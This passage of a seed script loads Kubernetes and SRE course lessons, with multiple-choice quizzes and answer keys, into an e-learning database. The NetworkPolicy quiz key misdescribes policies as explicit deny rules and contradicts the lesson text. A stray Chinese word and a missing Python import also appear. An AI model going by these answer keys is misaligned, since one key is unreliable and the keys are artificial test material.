            title: 'Pod & Container Management',
            order: 2,
            content: `# Pod & Container Management

### Learning Objectives

- Define and manage pod specifications
- Configure resource requests and limits
- Implement liveness and readiness probes
- Use Init containers and sidecar patterns

### Section 1: Pod Specification

Pods are the smallest deployable units. Containers within a pod share network namespace and storage. Multi-container pods enable sidecar patterns.

\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: web-app
  labels:
    app: web
spec:
  containers:
    - name: nginx
      image: nginx:1.25
      ports:
        - containerPort: 80
      resources:
        requests:
          memory: "64Mi"
          cpu: "250m"
        limits:
          memory: "128Mi"
          cpu: "500m"
      livenessProbe:
        httpGet:
          path: /healthz
          port: 80
        initialDelaySeconds: 10
        periodSeconds: 5
      readinessProbe:
        httpGet:
          path: /ready
          port: 80
        initialDelaySeconds: 5
        periodSeconds: 3
\`\`\`

### Section 2: Resource Management

Requests: minimum resources guaranteed. Limits: maximum resources allowed. QoS classes: Guaranteed, Burstable, BestEffort. Resource quotas at namespace level.

### Section 3: Health Checks

Liveness probes detect deadlocks and restart containers. Readiness probes control traffic routing. Startup probes for slow-starting applications.

### Section 4: Container Patterns

Sidecar: supplementary containers. Init containers: run before main containers. Ambassador: proxy pattern. Adapter: standardized output.

### Hands-On Practice

1. Create a pod with resource requests, limits, and health probes.
2. Implement a sidecar pattern with logging container.
3. Configure init containers for dependency checking.

### Key Takeaways

- Pods share network and storage within a pod
- Resource requests ensure minimum guaranteed resources
- Health probes enable self-healing containers
- Container patterns solve common architectural challenges

### References

- Pods: https://kubernetes.io/docs/concepts/workloads/pods/
- Resource Management: https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/
- Container Patterns: https://kubernetes.io/docs/concepts/workloads/pods/pod-pattern/`,
            questions: [
              { text: 'What is the smallest deployable unit in Kubernetes?', answers: [{ text: 'Pod', isCorrect: true }, { text: 'Container', isCorrect: false }, { text: 'Node', isCorrect: false }, { text: 'Deployment', isCorrect: false }] },
              { text: 'What do resource requests guarantee?', answers: [{ text: 'Minimum resources allocated to a container', isCorrect: true }, { text: 'Maximum resources allowed', isCorrect: false }, { text: 'Network bandwidth', isCorrect: false }, { text: 'Storage capacity', isCorrect: false }] },
              { text: 'What does a liveness probe detect?', answers: [{ text: 'Deadlocked or unresponsive containers that need restarting', isCorrect: true }, { text: 'High CPU usage', isCorrect: false }, { text: 'Low memory', isCorrect: false }, { text: 'Network latency', isCorrect: false }] },
              { text: 'What is a sidecar container?', answers: [{ text: 'Supplementary container that extends the main container functionality', isCorrect: true }, { text: 'Main application container', isCorrect: false }, { text: 'Database container', isCorrect: false }, { text: 'Load balancer container', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Networking & Services',
        order: 2,
        lessons: [
          {
            title: 'Service Types & Ingress',
            order: 1,
            content: `# Service Types & Ingress

### Learning Objectives

- Configure different Kubernetes service types
- Implement Ingress controllers for HTTP routing
- Use NetworkPolicies for traffic control
- Debug network connectivity issues

### Section 1: Service Types

ClusterIP: internal-only service. NodePort: exposes on node ports. LoadBalancer: cloud load balancer. ExternalName: CNAME alias.

\`\`\`yaml
# ClusterIP service
apiVersion: v1
kind: Service
metadata:
  name: backend-service
spec:
  selector:
    app: backend
  ports:
    - port: 80
      targetPort: 8080
  type: ClusterIP

# LoadBalancer service
apiVersion: v1
kind: Service
metadata:
  name: frontend-service
spec:
  selector:
    app: frontend
  ports:
    - port: 80
      targetPort: 80
  type: LoadBalancer
\`\`\`

### Section 2: Ingress

Ingress manages external HTTP/HTTPS access. Host-based and path-based routing. TLS termination. Ingress controllers: nginx, traefik, HAProxy.

### Section 3: NetworkPolicies

NetworkPolicies control pod-to-pod traffic. Default deny with explicit allow. Ingress and egress rules. Namespace-based isolation.

### Section 4: DNS and Discovery

CoreDNS provides service discovery. Automatic DNS entries for services. Headless services for stateful sets. External DNS for external name management.

### Hands-On Practice

1. Create ClusterIP and LoadBalancer services.
2. Configure Ingress with TLS termination.
3. Implement NetworkPolicies for pod isolation.

### Key Takeaways

- Service types provide different exposure mechanisms
- Ingress manages HTTP/HTTPS routing and TLS
- NetworkPolicies implement network-level isolation
- DNS enables automatic service discovery

### References

- Services: https://kubernetes.io/docs/concepts/services-networking/service/
- Ingress: https://kubernetes.io/docs/concepts/services-networking/ingress/
- NetworkPolicies: https://kubernetes.io/docs/concepts/services-networking/network-policies/`,
            questions: [
              { text: 'What is the difference between ClusterIP and LoadBalancer?', answers: [{ text: 'ClusterIP is internal-only; LoadBalancer exposes to internet via cloud LB', isCorrect: true }, { text: 'They are identical', isCorrect: false }, { text: 'ClusterIP is faster', isCorrect: false }, { text: 'LoadBalancer uses less resources', isCorrect: false }] },
              { text: 'What does an Ingress controller do?', answers: [{ text: 'Manages external HTTP/HTTPS access with routing and TLS', isCorrect: true }, { text: 'Manages internal pod communication', isCorrect: false }, { text: 'Stores cluster configuration', isCorrect: false }, { text: 'Schedules pods to nodes', isCorrect: false }] },
              { text: 'What is the default NetworkPolicy behavior?', answers: [{ text: 'Allow all traffic; policies must explicitly deny', isCorrect: true }, { text: 'Deny all traffic', isCorrect: false }, { text: 'Allow internal only', isCorrect: false }, { text: 'No default behavior', isCorrect: false }] },
              { text: 'What does CoreDNS provide?', answers: [{ text: 'Automatic service discovery and DNS resolution within the cluster', isCorrect: true }, { text: 'External DNS management only', isCorrect: false }, { text: 'Load balancing only', isCorrect: false }, { text: 'TLS certificate management', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Security & RBAC',
        order: 3,
        lessons: [
          {
            title: 'RBAC & Security Policies',
            order: 1,
            content: `# RBAC & Security Policies

### Learning Objectives

- Implement Role-Based Access Control
- Configure Pod Security Standards
- Use admission controllers for policy enforcement
- Apply security contexts to pods

### Section 1: RBAC

Roles define permissions. RoleBindings assign roles to users/groups. ClusterRoles for cluster-wide permissions. ClusterRoleBindings for cluster-wide assignments.

\`\`\`yaml
# Role definition
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: development
  name: pod-reader
rules:
  - apiGroups: [""]
    resources: ["pods", "pods/log"]
    verbs: ["get", "list", "watch"]

# RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: development
subjects:
  - kind: User
    name: jane
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
\`\`\`

### Section 2: Pod Security Standards

Restricted: most secure, minimal privileges. Baseline: prevents known privilege escalations. Privileged: unrestricted. Enforce standards at namespace level.

### Section 3: Admission Controllers

ValidatingAdmissionWebhooks enforce policies. MutatingAdmissionWebhooks modify requests. OPA Gatekeeper for policy enforcement. Kyverno for Kubernetes-native policies.

### Section 4: Security Contexts

RunAsNonRoot: prevent root containers. ReadOnlyRootFilesystem: prevent writes. Capabilities: drop all, add specific. Seccomp profiles: system call filtering.

### Hands-On Practice

1. Create RBAC roles for development team access.
2. Enforce Pod Security Standards at namespace level.
3. Implement security contexts for application pods.

### Key Takeaways

- RBAC provides fine-grained access control
- Pod Security Standards prevent privilege escalation
- Admission controllers enforce policies at API level
- Security contexts harden container runtime

### References

- RBAC: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- Pod Security Standards: https://kubernetes.io/docs/concepts/security/pod-security-standards/
- OPA Gatekeeper: https://open-policy-agent.github.io/gatekeeper/`,
            questions: [
              { text: 'What is the difference between Role and ClusterRole?', answers: [{ text: 'Role is namespace-scoped; ClusterRole is cluster-wide', isCorrect: true }, { text: 'They are identical', isCorrect: false }, { text: 'Role is more powerful', isCorrect: false }, {text: 'ClusterRole is for pods only', isCorrect: false}] },
              { text: 'What does RunAsNonRoot prevent?', answers: [{ text: 'Containers from running as root user', isCorrect: true }, { text: 'Network access', isCorrect: false }, { text: 'File system access', isCorrect: false }, {text: 'CPU usage', isCorrect: false}] },
              { text: 'What do admission controllers do?', answers: [{ text: 'Enforce or modify API requests before they are processed', isCorrect: true}, {text: 'Monitor pod logs only', isCorrect: false}, {text: 'Manage network policies only', isCorrect: false}, {text: 'Schedule pods only', isCorrect: false}] },
              { text: 'What is the most secure Pod Security Standard?', answers: [{ text: 'Restricted - minimal privileges and maximum security', isCorrect: true}, {text: 'Privileged - unrestricted access', isCorrect: false}, {text: 'Baseline - minimal restrictions', isCorrect: false}, {text: 'Default - no restrictions', isCorrect: false}] },
            ],
          },
        ],
      },
      {
        title: 'Monitoring & Troubleshooting',
        order: 4,
        lessons: [
          {
            title: 'Monitoring & Observability',
            order: 1,
            content: `# Monitoring & Observability

### Learning Objectives

- Implement Kubernetes monitoring with Prometheus
- Set up Grafana dashboards for cluster visibility
- Configure alerting for critical conditions
- Use distributed tracing for microservices

### Section 1: Prometheus & Grafana

Prometheus collects metrics. Grafana visualizes data. kube-prometheus-stack provides complete monitoring. ServiceMonitors define scrape targets.

\`\`\`yaml
# ServiceMonitor for Prometheus
apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata:
  name: my-app-monitor
  labels:
    release: prometheus
spec:
  selector:
    matchLabels:
      app: my-app
  endpoints:
    - port: metrics
      interval: 30s
\`\`\`

### Section 2: Key Metrics

RED metrics: Rate, Errors, Duration. USE metrics: Utilization, Saturation, Errors. Kubernetes metrics: pod count, restart count, resource usage.

### Section 3: Alerting

Prometheus Alertmanager routes alerts. Severity-based routing. Grouping and deduplication. Integration with Slack, PagerDuty, email.

### Section 4: Distributed Tracing

OpenTelemetry for vendor-neutral tracing. Jaeger for trace visualization. Service mesh integration with Istio or Linkerd.

### Hands-On Practice

1. Deploy kube-prometheus-stack for cluster monitoring.
2. Create Grafana dashboards for application metrics.
3. Configure Alertmanager for critical alerts.

### Key Takeaways

- Prometheus and Grafana provide comprehensive monitoring
- RED/USE metrics cover application and infrastructure health
- Alertmanager enables intelligent alert routing
- Distributed tracing provides microservice visibility

### References

- Prometheus: https://prometheus.io/
- Grafana: https://grafana.com/
- kube-prometheus-stack: https://github.com/prometheus-community/helm-charts`,
            questions: [
              { text: 'What do RED metrics measure?', answers: [{ text: 'Rate, Errors, and Duration of requests', isCorrect: true }, {text: 'Random, Encrypted, and Distributed systems', isCorrect: false}, {text: 'Resource, Execution, and Debug logs', isCorrect: false}, {text: 'Read, Execute, and Delete operations', isCorrect: false}] },
              { text: 'What does Prometheus collect?', answers: [{ text: 'Time-series metrics from applications and infrastructure', isCorrect: true}, {text: 'Log files only', isCorrect: false}, {text: 'Network packets only', isCorrect: false}, {text: 'User sessions only', isCorrect: false}] },
              { text: 'What is the kube-prometheus-stack?', answers: [{ text: 'Complete monitoring solution with Prometheus, Grafana, and alerting', isCorrect: true}, {text: 'Only Prometheus installation', isCorrect: false}, {text: 'Only Grafana dashboards', isCorrect: false}, {text: 'Only alerting rules', isCorrect: false}] },
              { text: 'What does OpenTelemetry provide?', answers: [{ text: 'Vendor-neutral distributed tracing and metrics collection', isCorrect: true}, {text: 'Only log aggregation', isCorrect: false}, {text: 'Only container runtime', isCorrect: false}, {text: 'Only network routing', isCorrect: false}] },
            ],
          },
          {
            title: 'Troubleshooting & Debugging',
            order: 2,
            content: `# Troubleshooting & Debugging

### Learning Objectives

- Debug pod startup failures
- Analyze network connectivity issues
- Investigate resource constraints
- Use kubectl effectively for debugging

### Section 1: Pod Troubleshooting

Common issues: ImagePullBackOff, CrashLoopBackOff, OOMKilled. Use kubectl describe, logs, and exec for investigation.

\`\`\`bash
# Debug pod issues
kubectl describe pod <pod-name>
kubectl logs <pod-name> --previous
kubectl exec -it <pod-name> -- /bin/sh

# Check events
kubectl get events --sort-by='.lastTimestamp'

# Check resource usage
kubectl top pods
kubectl top nodes
\`\`\`

### Section 2: Network Debugging

DNS resolution issues. Service connectivity. NetworkPolicy blocking traffic. Use临时 debugging pods.

### Section 3: Resource Issues

OOMKilled: container exceeded memory limits. CPU throttling: container not getting enough CPU. ResourceQuota limits. LimitRange defaults.

### Section 4: Control Plane Issues

etcd health. API server availability. Controller manager lag. Scheduler failures.

### Hands-On Practice

1. Debug a CrashLoopBackOff pod using logs and describe.
2. Investigate DNS resolution issues in a namespace.
3. Analyze resource constraints causing OOMKilled.

### Key Takeaways

- kubectl describe and logs are primary debugging tools
- Pod status reveals the category of issue
- Network debugging requires DNS and connectivity checks
- Resource monitoring prevents OOM and throttling

### References

- Troubleshooting: https://kubernetes.io/docs/tasks/debug/
- kubectl Debug: https://kubernetes.io/docs/reference/kubectl/cheatsheet/
- Common Issues: https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/`,
            questions: [
              { text: 'What does CrashLoopBackOff indicate?', answers: [{ text: 'Container is repeatedly crashing and restarting', isCorrect: true}, {text: 'Container is running normally', isCorrect: false}, {text: 'Container image is downloading', isCorrect: false}, {text: 'Container is waiting for network', isCorrect: false}] },
              { text: 'What does OOMKilled mean?', answers: [{ text: 'Container exceeded its memory limit and was terminated', isCorrect: true}, {text: 'Container exceeded CPU limit', isCorrect: false}, {text: 'Container lost network connection', isCorrect: false}, {text: 'Container was manually deleted', isCorrect: false}] },
              { text: 'What does kubectl describe reveal?', answers: [{ text: 'Detailed state, events, and conditions of a resource', isCorrect: true}, {text: 'Only resource names', isCorrect: false}, {text: 'Only resource IDs', isCorrect: false}, {text: 'Only resource creation time', isCorrect: false}] },
              { text: 'What does kubectl top show?', answers: [{ text: 'Current CPU and memory usage of pods and nodes', isCorrect: true}, {text: 'Pod restart counts only', isCorrect: false}, {text: 'Network latency only', isCorrect: false}, {text: 'Disk usage only', isCorrect: false}] },
            ],
          },
        ],
      },
    ],
  );

  // ====================================================================
  // 10. Site Reliability Engineering
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'Site Reliability Engineering',
    'Comprehensive SRE course covering reliability fundamentals, monitoring and observability, incident management, error budgets, toil reduction, and capacity planning. Students will implement SRE practices for production systems.',
    30,
    [
      {
        title: 'SRE Fundamentals',
        order: 1,
        lessons: [
          {
            title: 'SRE Principles & Culture',
            order: 1,
            content: `# SRE Principles & Culture

### Learning Objectives

- Understand SRE philosophy and principles
- Define Service Level Objectives (SLOs)
- Implement error budgets
- Balance reliability with feature velocity

### Section 1: SRE Philosophy

SRE applies software engineering to operations. Automate everything. Manage risk through error budgets. Reduce toil. Measure everything. Blameless culture.

### Section 2: SLI/SLO/SLA

SLI: Service Level Indicator — metrics measuring service behavior. SLO: target value for SLI. SLA: contractual agreement with consequences for missing SLO.

\`\`\`
SLI: Availability = 1 - (downtime / total_time)
SLO: 99.9% availability per quarter
SLA: Financial credits if below 99.9%

Example SLIs:
- Availability: successful requests / total requests
- Latency: requests < 200ms / total requests
- Throughput: successful requests per second
\`\`\`

### Section 3: Error Budgets

Error budget = 1 - SLO. Consumed by downtime and incidents. When budget is exhausted, stop features and focus on reliability. Prevents over-investment in reliability.

### Section 4: Toil Reduction

Toil: manual, repetitive, automatable, no enduring value. Measure toil percentage. Automate toil aggressively. Aim for less than 50% toil.

### Hands-On Practice

1. Define SLIs and SLOs for a sample application.
2. Calculate error budgets and track consumption.
3. Identify and categorize toil in operational workflows.

### Key Takeaways

- SRE balances reliability with feature velocity
- Error budgets prevent over-investment in reliability
- Toil reduction frees engineers for meaningful work
- Blameless culture enables learning from failures

### References

- SRE Book: https://sre.google/sre-book/table-of-contents/
- SLO Workshop: https://sre.google/workbook/implementing-slos/
- Error Budgets: https://sre.google/workbook/error-budget-policy/`,
            questions: [
              { text: 'What is the difference between SLI, SLO, and SLA?', answers: [{ text: 'SLI measures, SLO targets, SLA contracts', isCorrect: true }, {text: 'They are identical', isCorrect: false}, {text: 'SLI is contractual', isCorrect: false}, {text: 'SLO is a measurement', isCorrect: false}] },
              { text: 'What happens when error budget is exhausted?', answers: [{ text: 'Stop features and focus on reliability improvements', isCorrect: true}, {text: 'Increase feature development speed', isCorrect: false}, {text: 'Ignore reliability issues', isCorrect: false}, {text: 'Hire more engineers', isCorrect: false}] },
              { text: 'What is toil?', answers: [{ text: 'Manual, repetitive, automatable work with no enduring value', isCorrect: true}, {text: 'Important engineering work', isCorrect: false}, {text: 'Strategic planning', isCorrect: false}, {text: 'Code review', isCorrect: false}] },
              { text: 'What is the goal for toil percentage?', answers: [{ text: 'Less than 50% of engineering time', isCorrect: true}, {text: '100% of engineering time', isCorrect: false}, {text: '0% of engineering time', isCorrect: false}, {text: '75% of engineering time', isCorrect: false}] },
            ],
          },
        ],
      },
      {
        title: 'Monitoring & Observability',
        order: 2,
        lessons: [
          {
            title: 'Monitoring Architecture',
            order: 1,
            content: `# Monitoring Architecture

### Learning Objectives

- Design comprehensive monitoring systems
- Implement metrics collection and storage
- Create effective alerting rules
- Build operational dashboards

### Section 1: Monitoring Stack

Prometheus for metrics collection. Grafana for visualization. Alertmanager for alert routing. Loki for log aggregation. Jaeger for tracing.

### Section 2: Metrics Design

Four golden signals: latency, traffic, errors, saturation. RED for request-driven services. USE for resources. Custom business metrics.

\`\`\`python
# Prometheus metric types
from prometheus_client import Counter, Histogram, Gauge

# Counter: monotonically increasing
request_count = Counter('http_requests_total', 'Total HTTP requests', ['method', 'endpoint'])

# Histogram: distribution of values
request_duration = Histogram('http_request_duration_seconds', 'Request duration', ['method', 'endpoint'])

# Gauge: current value
active_connections = Gauge('active_connections', 'Current active connections')

# Usage
request_count.labels(method='GET', endpoint='/api/users').inc()
request_duration.labels(method='GET', endpoint='/api/users').observe(0.25)
active_connections.set(42)
\`\`\`

### Section 3: Alert Design

Alert on symptoms, not causes. Multi-window multi-burn-rate alerts. Avoid alert fatigue with proper thresholds. Page for user-facing issues only.

### Section 4: Dashboard Design

Role-based dashboards: executive, operational, debugging. Drill-down capability. Correlation across metrics. Real-time and historical views.

### Hands-On Practice

1. Design a monitoring stack with Prometheus, Grafana, and Alertmanager.
2. Implement the four golden signals for a web application.
3. Create operational dashboards for different roles.

### Key Takeaways

- Monitoring architecture should scale with the organization
- The four golden signals cover most service health aspects
- Symptom-based alerts reduce noise
- Role-based dashboards serve different audiences

### References

- Prometheus: https://prometheus.io/
- Grafana: https://grafana.com/
- Four Golden Signals: https://sre.google/sre-book/monitoring-distributed-systems/`,
            questions: [
              { text: 'What are the four golden signals?', answers: [{ text: 'Latency, Traffic, Errors, and Saturation', isCorrect: true}, {text: 'CPU, Memory, Disk, and Network', isCorrect: false}, {text: 'Request, Response, Error, and Timeout', isCorrect: false}, {text: 'Read, Write, Update, and Delete', isCorrect: false}] },
              { text: 'Why alert on symptoms, not causes?', answers: [{ text: 'Symptoms directly affect users; causes are implementation details', isCorrect: true}, {text: 'Symptoms are easier to detect', isCorrect: false}, {text: 'Causes cannot be monitored', isCorrect: false}, {text: 'It reduces monitoring costs', isCorrect: false}] },
              { text: 'What does a Histogram metric track?', answers: [{ text: 'Distribution of values over time', isCorrect: true}, {text: 'Only current value', isCorrect: false}, {text: 'Only total count', isCorrect: false}, {text: 'Only boolean status', isCorrect: false}] },
              { text: 'What is the purpose of role-based dashboards?', answers: [{ text: 'Serve different audiences with appropriate detail levels', isCorrect: true}, {text: 'Reduce dashboard count', isCorrect: false}, {text: 'Increase dashboard complexity', isCorrect: false}, {text: 'Simplify configuration', isCorrect: false}] },
            ],
          },
        ],
      },
      {
        title: 'Incident Management',
        order: 3,
        lessons: [
          {
            title: 'Incident Response Process',
            order: 1,
            content: `# Incident Response Process

### Learning Objectives

- Implement structured incident response
- Conduct effective incident communication
- Run blameless post-mortems
- Drive continuous improvement

### Section 1: Incident Lifecycle

Detection → Triage → Mitigation → Resolution → Post-mortem. Each phase has specific goals and participants.

### Section 2: Incident Commander

IC coordinates response. Makes decisions on escalation. Manages communication. Ensures process is followed. IC does not fix the issue.

\`\`\`
Incident Response Playbook:
1. Detection: Alert fires or user reports
2. Triage: Assess severity and impact
3. Declaration: IC declared, war room opened
4. Mitigation: Restore service (rollback, failover)
5. Resolution: Root cause addressed
6. Communication: Status updates to stakeholders
7. Post-mortem: Blameless review
\`\`\`

### Section 3: Communication

Internal: status page, Slack updates. External: customer notifications, public status. Consistent format: what, who, when, ETA.

### Section 4: Blameless Post-Mortems

Focus on systems, not people. What happened? Why? How to prevent? Action items with owners and deadlines. Share learnings widely.

### Hands-On Practice

1. Role-play an incident response with defined roles.
2. Write a blameless post-mortem for a simulated incident.
3. Create an incident communication template.

### Key Takeaways

- Structured response prevents chaos during incidents
- Incident Commander coordinates without fixing
- Blameless culture enables honest analysis
- Post-mortems drive continuous improvement

### References

- Incident Response: https://sre.google/workbook/incident-response/
- Post-mortem Culture: https://sre.google/workbook/postmortem-culture/
- Incident Management: https://www.pagerduty.com/resources/learn/incident-management/`,
            questions: [
              { text: 'What is the role of the Incident Commander?', answers: [{ text: 'Coordinates response and makes escalation decisions without fixing', isCorrect: true}, {text: 'Fixes the technical issue', isCorrect: false}, {text: 'Communicates only with external stakeholders', isCorrect: false}, {text: 'Writes code during incident', isCorrect: false}] },
              { text: 'What is a blameless post-mortem?', answers: [{ text: 'Focus on systems and processes, not individual blame', isCorrect: true}, {text: 'Blame individuals for mistakes', isCorrect: false}, {text: 'Avoid discussing incidents', isCorrect: false}, {text: 'Skip post-mortems for small incidents', isCorrect: false}] },
              { text: 'What should incident communication include?', answers: [{ text: 'What happened, who is affected, current status, and ETA', isCorrect: true}, {text: 'Only technical details', isCorrect: false}, {text: 'Only status updates', isCorrect: false}, {text: 'Only blame assignment', isCorrect: false}] },
              { text: 'What does mitigation focus on?', answers: [{ text: 'Restoring service quickly, not necessarily fixing root cause', isCorrect: true}, {text: 'Finding root cause immediately', isCorrect: false}, {text: 'Writing post-mortem', isCorrect: false}, {text: 'Updating documentation', isCorrect: false}] },
            ],
          },
        ],
      },
      {
        title: 'Reliability Engineering',
        order: 4,
        lessons: [
          {
            title: 'Capacity Planning & Performance',
            order: 1,
            content: `# Capacity Planning & Performance

### Learning Objectives

- Forecast resource requirements
- Implement auto-scaling strategies
- Optimize application performance
- Conduct load testing and capacity experiments

### Section 1: Capacity Planning

Forecast growth based on historical trends. Model resource requirements. Account for peak loads and growth. Budget for headroom.

### Section 2: Auto-scaling

Horizontal Pod Autoscaler scales pods. Cluster Autoscaler scales nodes. Custom metrics for scaling decisions. Scaling policies and cooldowns.

\`\`\`yaml
# Horizontal Pod Autoscaler
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: web-app-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: web-app
  minReplicas: 2
  maxReplicas: 10
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70
    - type: Pods
      pods:
        metric:
          name: http_requests_per_second
        target:
          type: AverageValue
          averageValue: 1000
\`\`\`

### Section 3: Performance Engineering

Profile before optimizing. Identify bottlenecks. Optimize critical path. Cache aggressively. Use CDN for static assets.

### Section 4: Load Testing

k6 for load testing. Baseline performance measurement. Capacity experiments. Chaos engineering for resilience testing.

### Hands-On Practice

1. Configure HPA with CPU and custom metrics.
2. Conduct a load test and analyze results.
3. Implement capacity forecasting based on historical data.

### Key Takeaways

- Capacity planning prevents resource exhaustion
- Auto-scaling handles variable loads efficiently
- Performance engineering requires measurement before optimization
- Load testing validates capacity assumptions

### References

- HPA: https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/
- k6: https://k6.io/
- Capacity Planning: https://sre.google/workbook/capacity-planning/`,
            questions: [
              { text: 'What does the Horizontal Pod Autoscaler do?', answers: [{ text: 'Automatically scales pod count based on metrics', isCorrect: true}, {text: 'Scales node count', isCorrect: false}, {text: 'Manages pod scheduling only', isCorrect: false}, {text: 'Controls network bandwidth only', isCorrect: false}] },
              { text: 'Why load test before capacity planning?', answers: [{ text: 'Validate assumptions and identify bottlenecks', isCorrect: true}, {text: 'To increase load on the system', isCorrect: false}, {text: 'To reduce monitoring costs', isCorrect: false}, {text: 'To simplify configuration', isCorrect: false}] },
              { text: 'What should you optimize first?', answers: [{ text: 'Profile first, then optimize the critical path', isCorrect: true}, {text: 'Optimize everything equally', isCorrect: false}, {text: 'Optimize only frontend code', isCorrect: false}, {text: 'Optimize only database queries', isCorrect: false}] },
              { text: 'What does the Cluster Autoscaler manage?', answers: [{ text: 'Node count based on pending pods and resource requests', isCorrect: true}, {text: 'Pod count based on CPU', isCorrect: false}, {text: 'Network traffic based on latency', isCorrect: false}, {text: 'Storage based on usage', isCorrect: false}] },
            ],
          },
          {
            title: 'Toil Reduction & Automation',
            order: 2,
            content: `# Toil Reduction & Automation

### Learning Objectives

- Identify and categorize toil
- Automate operational tasks
- Build self-healing systems
- Measure automation effectiveness

### Section 1: Toil Identification

Toil is manual, repetitive, automatable, tactical, no enduring value, scales linearly. Track time spent on toil. Categorize by type and frequency.

### Section 2: Automation Strategies

Automate repetitive tasks. Build runbooks as code. Create self-service portals. Automate incident response. Automate compliance checks.

\`\`\`python
# Toil tracking
class ToilTracker:
    def __init__(self):
        self.tasks = []

    def log_task(self, task_type, duration_minutes, description):
        self.tasks.append({
            'type': task_type,
            'duration': duration_minutes,
            'description': description,
            'timestamp': datetime.now()
        })

    def get_toil_percentage(self, total_engineering_time):
        toil_time = sum(t['duration'] for t in self.tasks)
        return (toil_time / total_engineering_time) * 100

    def get_toil_by_type(self):
        types = {}
        for task in self.tasks:
            types[task['type']] = types.get(task['type'], 0) + task['duration']
        return types
\`\`\`

### Section 3: Self-Healing Systems

Automated restart on failure. Automatic scaling on load. Self-healing infrastructure. Chaos engineering for resilience testing.

### Section 4: Measuring Automation

Track time saved. Measure MTTR reduction. Monitor error reduction. Calculate ROI of automation investments.

### Hands-On Practice

1. Audit operational tasks and categorize toil.
2. Automate a common operational task.
3. Build a self-healing system that recovers from common failures.

### Key Takeaways

- Toil identification is the first step to reduction
- Automation multiplies engineering effectiveness
- Self-healing systems reduce operational burden
- Measure automation effectiveness to justify investment

### References

- Toil: https://sre.google/sre-book/eliminating-toil/
- Automation: https://sre.google/workbook/automation-overview/
- Self-Healing: https://sre.google/sre-book/practical-alerting/`,
            questions: [
              { text: 'What characterizes toil?', answers: [{ text: 'Manual, repetitive, automatable, no enduring value', isCorrect: true}, {text: 'Creative engineering work', isCorrect: false}, {text: 'Strategic planning', isCorrect: false}, {text: 'Architecture design', isCorrect: false}] },
              { text: 'What is the goal of toil reduction?', answers: [{ text: 'Free engineers for meaningful, enduring work', isCorrect: true}, {text: 'Eliminate all work', isCorrect: false}, {text: 'Increase operational tasks', isCorrect: false}, {text: 'Reduce team size', isCorrect: false}] },
              { text: 'What does a self-healing system do?', answers: [{ text: 'Automatically recovers from common failures without human intervention', isCorrect: true}, {text: 'Requires manual restart', isCorrect: false}, {text: 'Ignores all errors', isCorrect: false}, {text: 'Sends alerts only', isCorrect: false}] },
              { text: 'Why measure automation effectiveness?', answers: [{ text: 'Justify investment and identify high-value automation opportunities', isCorrect: true}, {text: 'To reduce automation', isCorrect: false}, {text: 'To increase toil', isCorrect: false}, {text: 'To complicate processes', isCorrect: false}] },
            ],
          },
        ],
      },
    ],
  );
}

